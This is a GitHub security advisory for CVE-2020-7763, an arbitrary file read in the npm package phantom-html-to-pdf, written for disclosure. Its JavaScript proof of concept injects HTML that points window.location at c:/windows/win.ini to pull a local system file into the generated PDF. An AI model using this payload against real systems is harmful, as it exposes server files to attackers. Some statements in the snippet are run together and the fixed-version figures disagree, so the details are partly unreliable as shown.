# [H] Arbitrary File Read in phantom-html-to-pdf

## Summary
Severity: High
Advisory: GHSA-6h7f-qwqm-35pp
CVE: CVE-2020-7763
CWE: CWE-200, CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2020-11-06
Source: https://github.com/advisories/GHSA-6h7f-qwqm-35pp
Type: github-advisory

## Affected
- npm: `phantom-html-to-pdf` — affected >=0 <0.6.2

## Details
This affects the package phantom-html-to-pdf before 0.6.1.

### PoC
```js
var fs = require('fs') var conversion = require("phantom-html-to-pdf")();
conversion.allowLocalFilesAccess = false conversion({
    html: "document.write(window.location='c:/windows/win.ini')"
}, function(err, pdf) {
    var output = fs.createWriteStream('output.pdf') console.log(pdf.logs);
    console.log(pdf.numberOfPages);
    pdf.stream.pipe(output);
});
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7763
- https://github.com/pofider/phantom-html-to-pdf/commit/b5d2da2639a49a95e0bdb3bc0c987cb6406b8259
- https://snyk.io/vuln/SNYK-JS-PHANTOMHTMLTOPDF-1023598
- https://www.npmjs.com/package/phantom-html-to-pdf
